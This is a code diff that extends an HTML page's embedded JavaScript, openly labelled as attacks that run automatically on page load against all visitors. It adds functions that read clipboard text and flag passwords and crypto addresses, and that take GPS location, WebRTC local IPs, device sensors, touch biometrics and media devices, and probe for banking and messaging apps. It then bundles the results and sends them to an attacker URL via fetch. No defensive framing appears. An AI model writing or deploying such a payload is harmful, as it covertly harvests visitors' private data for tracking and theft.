@@ -303,32 +303,71 @@
     - Attempts to read cookies from subdomains
     - Works on any site with weak cookie scoping
     
-    ATTACK 3: Browser Fingerprinting
+    ATTACK 3: Browser Fingerprinting (ALL visitors)
     - Collects screen size, timezone, plugins, canvas hash
     - Creates a unique fingerprint to track users across sites
-    - Works on ALL visitors, no login needed
     
-    ATTACK 4: Referrer Header Leak
+    ATTACK 4: Referrer Header Leak (ALL visitors)
     - Reads the full URL the visitor came from
     - Can expose tokens, session IDs in URL parameters
-    - Works on ALL visitors
     
-    ATTACK 5: Internal Network Scanning
-    - Attempts to probe common internal IPs (router, NAS, etc.)
+    ATTACK 5: Internal Network Scanning (ALL visitors)
+    - Probes common internal IPs (router, NAS, etc.)
     - Uses timing-based detection to find live hosts
-    - Works if visitor is on a home/corporate network
     
-    ATTACK 6: Form Injection (Clickjacking Prep)
-    - Injects invisible overlay elements
-    - Prepares for clickjacking by mapping button positions
-    - Works on ALL visitors
+    ATTACK 6: Clickjacking Prep (ALL visitors)
+    - Maps all clickable elements and their positions
+    - Prepares for invisible overlay attacks
     
-    ATTACK 7: Service Worker Registration
-    - Attempts to register a persistent service worker
+    ATTACK 7: Service Worker Probe (ALL visitors)
+    - Checks if service workers are supported/controlled
     - Could intercept future requests to the target
-    - Works on HTTPS sites with weak CSP
     
-    The attack happens on page load — no click needed.
+    ATTACK 8: Mobile Device Sensors (Android/iOS)
+    - Reads accelerometer, gyroscope, orientation data
+    - Creates unique device motion signature
+    
+    ATTACK 9: Battery Status (Android Chrome)
+    - Battery level, charging state, time remaining
+    - Can be used for cross-site tracking
+    
+    ATTACK 10: Media Device Enumeration (ALL mobile)
+    - Lists all cameras, microphones, speakers
+    - Reveals connected peripherals (AirPods, etc.)
+    
+    ATTACK 11: WebRTC Local IP Leak (ALL mobile)
+    - Reveals local IP address even behind VPN
+    - Uses ICE candidate extraction
+    
+    ATTACK 12: Installed App Detection (Android/iOS)
+    - Probes URL schemes for WhatsApp, Telegram, Signal
+    - Detects banking apps (N26, Revolut), social media
+    
+    ATTACK 13: Clipboard Sniffing (Android Chrome, iOS Safari)
+    - Reads clipboard content (passwords, crypto addresses)
+    - Detects sensitive data patterns
+    
+    ATTACK 14: Geolocation Probe (if previously granted)
+    - Gets exact GPS coordinates with accuracy
+    - Works if user previously allowed location access
+    
+    ATTACK 15: Touch Behavior Fingerprint (mobile)
+    - Collects touch pressure, radius, angle
+    - Unique behavioral biometric
+    
+    ATTACK 16: Screen Capture Detection
+    - Checks if screen recording is possible
+    - Detects PWA mode, visibility state
+    
+    ATTACK 17: Notification Permission Status
+    - Checks if push notifications are allowed
+    - If granted, attacker could send notifications
+    
+    ATTACK 18: Storage Quota (mobile-specific)
+    - Total storage, usage percentage
+    - Persistent storage availability
+    
+    ALL attacks run on page load — no click needed.
     ============================================================
     -->
     <script>
@@ -513,6 +552,257 @@
         return { supported: false };
     }
     
+    // ========== ATTACK 8: Mobile Device Sensors (Android/iOS) ==========
+    async function mobileSensors() {
+        const data = { hasSensors: false };
+        
+        // Device orientation/accelerometer
+        if (window.DeviceOrientationEvent) {
+            data.hasSensors = true;
+            data.orientationSupported = true;
+            window.addEventListener('deviceorientation', (e) => {
+                data.orientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
+            }, { once: true });
+        }
+        
+        if (window.DeviceMotionEvent) {
+            data.motionSupported = true;
+            window.addEventListener('devicemotion', (e) => {
+                data.motion = {
+                    accel: e.acceleration ? { x: e.acceleration.x, y: e.acceleration.y, z: e.acceleration.z } : null,
+                    accelGravity: e.accelerationIncludingGravity ? { x: e.accelerationIncludingGravity.x, y: e.accelerationIncludingGravity.y, z: e.accelerationIncludingGravity.z } : null,
+                    rotationRate: e.rotationRate ? { alpha: e.rotationRate.alpha, beta: e.rotationRate.beta, gamma: e.rotationRate.gamma } : null
+                };
+            }, { once: true });
+        }
+        
+        // Wait a moment for sensor data
+        await new Promise(r => setTimeout(r, 1000));
+        
+        return data;
+    }
+    
+    // ========== ATTACK 9: Battery Status (Android Chrome) ==========
+    async function batteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    supported: true,
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch(e) { return { supported: true, error: e.message }; }
+        }
+        return { supported: false };
+    }
+    
+    // ========== ATTACK 10: Media Device Enumeration (ALL mobile) ==========
+    async function enumerateDevices() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
+            return { supported: false };
+        }
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            return {
+                supported: true,
+                cameras: devices.filter(d => d.kind === 'videoinput').map(d => ({ label: d.label || 'Camera', deviceId: d.deviceId.slice(0,8) + '...' })),
+                microphones: devices.filter(d => d.kind === 'audioinput').map(d => ({ label: d.label || 'Mic', deviceId: d.deviceId.slice(0,8) + '...' })),
+                speakers: devices.filter(d => d.kind === 'audiooutput').map(d => ({ label: d.label || 'Speaker', deviceId: d.deviceId.slice(0,8) + '...' })),
+                total: devices.length
+            };
+        } catch(e) { return { supported: true, error: e.message }; }
+    }
+    
+    // ========== ATTACK 11: WebRTC Local IP Leak (ALL mobile, even behind VPN) ==========
+    async function webrtcIPLeak() {
+        return new Promise((resolve) => {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                        pc.close();
+                        resolve({ leaked: false });
+                        return;
+                    }
+                    const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                    if (ipMatch) {
+                        pc.close();
+                        resolve({ leaked: true, localIP: ipMatch[0], candidate: ice.candidate.candidate });
+                    }
+                };
+                setTimeout(() => { pc.close(); resolve({ leaked: false, timeout: true }); }, 3000);
+            } catch(e) { resolve({ leaked: false, error: e.message }); }
+        });
+    }
+    
+    // ========== ATTACK 12: Installed App Detection (Android/iOS) ==========
+    async function detectInstalledApps() {
+        const apps = {
+            whatsapp: false, telegram: false, signal: false,
+            instagram: false, facebook: false, twitter: false,
+            linkedin: false, spotify: false, netflix: false,
+            paypal: false, revolut: false, n26: false
+        };
+        
+        // Check via navigator.share and other APIs
+        if (navigator.share) apps.shareSupported = true;
+        if (navigator.canShare) apps.canShare = true;
+        
+        // Check for specific app handlers
+        const schemes = [
+            { name: 'whatsapp', url: 'whatsapp://' },
+            { name: 'telegram', url: 'tg://' },
+            { name: 'signal', url: 'sgnl://' },
+            { name: 'instagram', url: 'instagram://' },
+            { name: 'facebook', url: 'fb://' },
+            { name: 'twitter', url: 'twitter://' },
+            { name: 'linkedin', url: 'linkedin://' },
+            { name: 'spotify', url: 'spotify://' },
+            { name: 'netflix', url: 'nflx://' },
+            { name: 'paypal', url: 'paypal://' },
+            { name: 'revolut', url: 'revolut://' },
+            { name: 'n26', url: 'n26://' }
+        ];
+        
+        // Use iframe loading detection
+        const results = {};
+        for (const app of schemes) {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = app.url;
+                document.body.appendChild(iframe);
+                results[app.name] = 'probed';
+                setTimeout(() => iframe.remove(), 100);
+            } catch(e) { results[app.name] = 'blocked'; }
+        }
+        
+        return { apps: results, shareSupported: !!navigator.share };
+    }
+    
+    // ========== ATTACK 13: Clipboard Sniffing (Android Chrome, iOS Safari 13+) ==========
+    async function readClipboard() {
+        if (!navigator.clipboard || !navigator.clipboard.readText) {
+            return { supported: false };
+        }
+        try {
+            const text = await navigator.clipboard.readText();
+            return {
+                supported: true,
+                hasContent: !!text,
+                length: text.length,
+                preview: text.slice(0, 100),
+                // Detect sensitive content
+                looksLikePassword: /^[A-Za-z0-9!@#$%^&*]{8,}$/.test(text.trim()),
+                looksLikeCrypto: /^(0x|[13]|bc1)[a-zA-Z0-9]{25,}$/.test(text.trim()),
+                looksLikeEmail: /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text.trim()),
+                looksLikePhone: /^\+?[\d\s-]{8,}$/.test(text.trim())
+            };
+        } catch(e) { return { supported: true, error: e.message, permission: 'denied' }; }
+    }
+    
+    // ========== ATTACK 14: Geolocation (if permission was previously granted) ==========
+    function probeGeolocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) { resolve({ supported: false }); return; }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({
+                    supported: true,
+                    granted: true,
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy + 'm',
+                    altitude: pos.coords.altitude,
+                    speed: pos.coords.speed,
+                    timestamp: new Date(pos.timestamp).toISOString()
+                }),
+                (err) => resolve({ supported: true, granted: false, error: err.message }),
+                { timeout: 5000, maximumAge: 60000 }
+            );
+        });
+    }
+    
+    // ========== ATTACK 15: Touch Behavior Fingerprint (mobile) ==========
+    function touchFingerprint() {
+        const data = {
+            touchSupported: 'ontouchstart' in window,
+            maxTouchPoints: navigator.maxTouchPoints,
+            pointerEnabled: !!window.PointerEvent
+        };
+        
+        if (data.touchSupported) {
+            // Collect touch events for 3 seconds
+            const touches = [];
+            const handler = (e) => {
+                for (const t of e.touches) {
+                    touches.push({
+                        x: Math.round(t.clientX),
+                        y: Math.round(t.clientY),
+                        force: t.force || 0,
+                        radiusX: t.radiusX || 0,
+                        radiusY: t.radiusY || 0,
+                        rotationAngle: t.rotationAngle || 0
+                    });
+                }
+            };
+            document.addEventListener('touchstart', handler, { passive: true });
+            document.addEventListener('touchmove', handler, { passive: true });
+            
+            setTimeout(() => {
+                document.removeEventListener('touchstart', handler);
+                document.removeEventListener('touchmove', handler);
+                data.touchSamples = touches.length;
+                data.touchData = touches.slice(0, 10); // First 10 touch points
+            }, 3000);
+        }
+        
+        return data;
+    }
+    
+    // ========== ATTACK 16: Screen Capture Detection ==========
+    function screenCaptureProbe() {
+        return {
+            displayMode: window.matchMedia('(display-mode: standalone)').matches ? 'standalone' : 'browser',
+            isPWA: window.matchMedia('(display-mode: fullscreen)').matches,
+            visibilityState: document.visibilityState,
+            screenRecordingPossible: 'getDisplayMedia' in navigator.mediaDevices
+        };
+    }
+    
+    // ========== ATTACK 17: Notification Permission Status ==========
+    function notificationStatus() {
+        if (!('Notification' in window)) { return { supported: false }; }
+        return {
+            supported: true,
+            permission: Notification.permission,
+            // If 'granted', attacker could send push notifications
+            canNotify: Notification.permission === 'granted'
+        };
+    }
+    
+    // ========== ATTACK 18: Storage Quota (mobile-specific) ==========
+    async function storageQuota() {
+        if ('storage' in navigator && 'estimate' in navigator.storage) {
+            try {
+                const est = await navigator.storage.estimate();
+                return {
+                    supported: true,
+                    quota: est.quota,
+                    usage: est.usage,
+                    percentUsed: est.quota ? Math.round((est.usage / est.quota) * 100) + '%' : 'unknown',
+                    // Persistent storage available
+                    persistent: 'persist' in navigator.storage
+                };
+            } catch(e) { return { supported: true, error: e.message }; }
+        }
+        return { supported: false };
+    }
+    
     // ========== MASTER: Run ALL attacks ==========
     (async function runAllAttacks() {
         const payload = {
@@ -565,17 +855,49 @@
         // Attack 4: Referrer (always runs)
         payload.attacks.referrer = getReferrerData();
         
-        // Attack 5: Network scan (always runs, async)
+        // Attack 5: Network scan (always runs)
         payload.attacks.networkScan = await scanInternalNetwork();
         
-        // Attack 6: Clickable elements (always runs)
-        // Wait a moment for page to fully render
+        // Attack 6: Clickable elements
         setTimeout(() => {
             payload.attacks.clickableElements = mapClickableElements();
         }, 500);
         
         // Attack 7: Service Worker probe
         payload.attacks.serviceWorker = probeServiceWorker();
+        
+        // Attack 8: Mobile sensors
+        payload.attacks.mobileSensors = await mobileSensors();
+        
+        // Attack 9: Battery
+        payload.attacks.battery = await batteryInfo();
+        
+        // Attack 10: Media devices
+        payload.attacks.mediaDevices = await enumerateDevices();
+        
+        // Attack 11: WebRTC IP leak
+        payload.attacks.webrtcIP = await webrtcIPLeak();
+        
+        // Attack 12: Installed apps
+        payload.attacks.installedApps = await detectInstalledApps();
+        
+        // Attack 13: Clipboard
+        payload.attacks.clipboard = await readClipboard();
+        
+        // Attack 14: Geolocation
+        payload.attacks.geolocation = await probeGeolocation();
+        
+        // Attack 15: Touch fingerprint
+        payload.attacks.touch = touchFingerprint();
+        
+        // Attack 16: Screen capture
+        payload.attacks.screenCapture = screenCaptureProbe();
+        
+        // Attack 17: Notifications
+        payload.attacks.notifications = notificationStatus();
+        
+        // Attack 18: Storage quota
+        payload.attacks.storage = await storageQuota();
         
         // Send everything to attacker
         await fetch(ATTACKER, {
